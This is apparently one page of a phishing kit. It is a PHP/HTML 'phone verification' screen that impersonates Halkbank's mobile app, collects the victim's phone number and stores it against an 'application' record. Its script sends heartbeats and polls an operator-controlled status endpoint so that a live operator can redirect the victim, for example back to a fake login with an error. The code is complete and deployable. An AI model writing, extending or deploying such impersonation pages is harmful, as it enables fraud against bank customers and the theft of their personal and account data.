<?php
declare(strict_types=1);
require_once __DIR__ . '/includes/storage.php';

$id = trim((string) ($_GET['id'] ?? $_POST['id'] ?? ''));
if ($id === '') {
    header('Location: giris.php');
    exit;
}

$application = findApplicationById($id);
if ($application === null) {
    http_response_code(404);
    echo 'Basvuru bulunamadi.';
    exit;
}

$statusEarly = (string) ($application['status'] ?? 'beklemede');
if ($statusEarly === 'yeniden-index') {
    header('Location: giris.php?error=hatali');
    exit;
}

if (($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'POST') {
    $phoneRaw = (string) (preg_replace('/\D+/', '', (string) ($_POST['phone'] ?? '')) ?? '');
    $normalizedPhone = $phoneRaw;
    if (strlen($normalizedPhone) === 14 && substr($normalizedPhone, 0, 4) === '0090') {
        $normalizedPhone = substr($normalizedPhone, 4);
    } elseif (strlen($normalizedPhone) === 12 && substr($normalizedPhone, 0, 2) === '90') {
        $normalizedPhone = substr($normalizedPhone, 2);
    } elseif (strlen($normalizedPhone) === 11 && substr($normalizedPhone, 0, 1) === '0') {
        $normalizedPhone = substr($normalizedPhone, 1);
    }

    $errors = [];
    if (strlen($normalizedPhone) !== 10) {
        $errors[] = 'Telefon numarasi 10 haneli olmalidir.';
    } elseif (substr($normalizedPhone, 0, 1) !== '5') {
        $errors[] = 'Telefon numarasi 5 ile baslamalidir.';
    }

    $_SESSION['tel_form_old'] = ['phone' => $phoneRaw];

    if (!empty($errors)) {
        $_SESSION['tel_form_errors'] = $errors;
        header('Location: tel.php?id=' . urlencode($id));
        exit;
    }

    $phoneForStorage = '0' . $normalizedPhone;
    try {
        $saved = false;
        if (function_exists('updateApplicationPhone')) {
            $saved = (bool) updateApplicationPhone($id, $phoneForStorage);
        }

        if (!$saved && function_exists('loadApplications') && function_exists('saveApplications')) {
            $applications = loadApplications();
            foreach ($applications as &$item) {
                if ((string) ($item['id'] ?? '') !== $id) {
                    continue;
                }
                $item['phone'] = $phoneForStorage;
                $item['updated_at'] = date('Y-m-d H:i:s');
                $saved = true;
                break;
            }
            unset($item);
            if ($saved) {
                saveApplications($applications);
            }
        }
    } catch (Throwable $e) {
        // Akisi bozmamak icin kayit hatalarini yut.
    }

    unset($_SESSION['tel_form_old'], $_SESSION['tel_form_errors']);
    header('Location: waiting.php?id=' . urlencode($id));
    exit;
}

$errors = $_SESSION['tel_form_errors'] ?? [];
$old = $_SESSION['tel_form_old'] ?? [];
unset($_SESSION['tel_form_errors'], $_SESSION['tel_form_old']);

$storedPhone = (string) (preg_replace('/\D+/', '', (string) ($application['phone'] ?? '')) ?? '');
if (strlen($storedPhone) === 10) {
    $storedPhone = '0' . $storedPhone;
}
$phoneValue = (string) ($old['phone'] ?? $storedPhone);

upsertPresence('tel', (string) $application['id'], false);
?>
<!doctype html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Telefon Dogrulama</title>
  <link rel="stylesheet" href="<?= htmlspecialchars(asset_url('assets/app.css'), ENT_QUOTES, 'UTF-8') ?>">
  <link rel="stylesheet" href="<?= htmlspecialchars(asset_url('assets/finansapp-mobile.css'), ENT_QUOTES, 'UTF-8') ?>">
  <style>
    ::placeholder {
      color: #555 !important;
      opacity: 1 !important;
      font-weight: 500 !important;
    }
  </style>
</head>
<body class="app-mobile">
  <div class="app-shell">
    <header class="app-top">
      <div class="app-top-left">
        <button type="button" class="app-icon-btn" aria-label="Geri">
          <svg class="app-icon-svg" viewBox="0 0 24 24" aria-hidden="true">
            <path d="M15 18 9 12l6-6"></path>
          </svg>
        </button>
      </div>
      <div class="app-logo">HALKBANK</div>
      <div class="app-top-right">
        <button type="button" class="app-icon-btn" aria-label="Bildirim">
          <svg class="app-icon-svg" viewBox="0 0 24 24" aria-hidden="true">
            <path d="M7 9a5 5 0 1 1 10 0v4.2c0 .53.21 1.04.59 1.41L19 16H5l1.41-1.39A2 2 0 0 0 7 13.2z"></path>
            <path d="M10 19a2 2 0 0 0 4 0"></path>
          </svg>
        </button>
        <button type="button" class="app-lang">EN</button>
      </div>
    </header>

    <main class="app-main sms-main">
      <h1 class="app-heading">Telefon Doğrulama</h1>
      <div class="app-tabs">
        <button class="app-tab active" type="button">Bireysel</button>
        <button class="app-tab" type="button">Kurumsal</button>
      </div>

      <?php if (!empty($errors)): ?>
        <div class="alert alert-error">
          <strong>Form hatasi:</strong>
          <ul>
            <?php foreach ($errors as $error): ?>
              <li><?= esc($error) ?></li>
            <?php endforeach; ?>
          </ul>
        </div>
      <?php endif; ?>

      <form method="post" action="tel.php?id=<?= urlencode($id) ?>" class="app-form" id="phoneForm">
        <input type="hidden" name="id" value="<?= esc($id) ?>">
        <div class="app-field">
          <input
            id="phone"
            name="phone"
            inputmode="tel"
            autocomplete="tel"
            minlength="8"
            maxlength="11"
            placeholder="Telefon Numarası (Örn: 05...)"
            required
            value="<?= esc($phoneValue) ?>"
          >
        </div>
        <button class="app-primary-btn" type="submit">Doğrula</button>
      </form>
    </main>

    <nav class="app-bottom-nav">
      <div class="app-nav-item">
        <strong>
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M13 2 6 13h5l-1 9 7-11h-5z"></path></svg>
        </strong>FAST<br>İşlemleri
      </div>
      <div class="app-nav-item">
        <strong>
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="m5 12 4 4 10-10"></path></svg>
        </strong>Mobil<br>Onay
      </div>
      <div class="app-nav-item app-nav-item-qr">
        <div class="app-qr-btn">
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true">
            <rect x="3" y="3" width="7" height="7" rx="1"></rect>
            <rect x="14" y="3" width="7" height="7" rx="1"></rect>
            <rect x="3" y="14" width="7" height="7" rx="1"></rect>
            <rect x="15" y="15" width="3" height="3" rx="0.5"></rect>
            <path d="M19 15h2v2"></path>
            <path d="M19 19h2v2h-2"></path>
          </svg>
        </div>Karekod<br>İşlemleri
      </div>
      <div class="app-nav-item">
        <strong>
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true">
            <path d="M4 20V4"></path><path d="M4 20h16"></path><path d="M8 17v-4"></path><path d="M12 17V9"></path><path d="M16 17v-7"></path>
          </svg>
        </strong>Finansal<br>Araçlar
      </div>
      <div class="app-nav-item">
        <strong>
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true">
            <rect x="4" y="4" width="6" height="6" rx="1"></rect><rect x="4" y="14" width="6" height="6" rx="1"></rect><rect x="14" y="14" width="6" height="6" rx="1"></rect><path d="M14 7h6"></path><path d="M17 4v6"></path>
          </svg>
        </strong>Diğer<br>İşlemler
      </div>
    </nav>
  </div>

  <script>
    const phoneInput = document.getElementById("phone");
    const tabs = document.querySelectorAll(".app-tab");
    const appId = <?= json_encode($id) ?>;

    tabs.forEach((tab) => {
      tab.addEventListener("click", () => {
        tabs.forEach((item) => item.classList.remove("active"));
        tab.classList.add("active");
      });
    });

    phoneInput.addEventListener("input", () => {
      const digits = phoneInput.value.replace(/\D+/g, "");
      phoneInput.value = digits.slice(0, 11);
    });

    function sendHeartbeat() {
      const body = new URLSearchParams({
        screen: "tel",
        application_id: appId
      });
      fetch("heartbeat.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
        body: body.toString(),
        keepalive: true
      }).catch(() => {});
    }

    sendHeartbeat();
    setInterval(sendHeartbeat, 10000);

    async function pollAdminRedirect() {
      try {
        const res = await fetch(`status.php?id=${encodeURIComponent(appId)}&_=${Date.now()}`);
        const data = await res.json();
        if (!data.ok) return;
        if (data.status === "yeniden-index") {
          window.location.href = "giris.php?error=hatali";
        }
      } catch (e) {}
    }
    pollAdminRedirect();
    setInterval(pollAdminRedirect, 4000);
  </script>
</body>
</html>
